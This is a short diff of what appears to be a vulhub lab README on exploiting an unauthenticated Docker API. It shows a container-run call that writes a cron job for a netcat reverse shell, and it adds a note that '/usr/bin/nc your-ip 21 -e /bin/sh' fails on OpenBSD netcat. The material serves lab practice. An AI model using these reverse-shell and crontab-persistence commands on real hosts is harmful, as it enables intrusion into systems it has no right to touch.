@@ -29,3 +29,5 @@ data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bi
 写入crontab文件，成功反弹shell：
 
 ![](1.png)
+
+**PS.** 注意，这里的 payload 影响到的是宿主机的 `/etc/` 目录，执行反弹shell的动作也是来自于宿主机，则 payload 中所执行的命令会受到宿主机操作系统及环境的差异带来影响，例如： [Issue #66](https://github.com/vulhub/vulhub/issues/66) 中， 操作系统的中 nc 属于 OpenBSD 分支，`-e` 参数存在差异（[见文档](http://man.openbsd.org/nc)），所以 `/usr/bin/nc your-ip 21 -e /bin/sh` 这个payload是无法正常执行的，请自行修改。
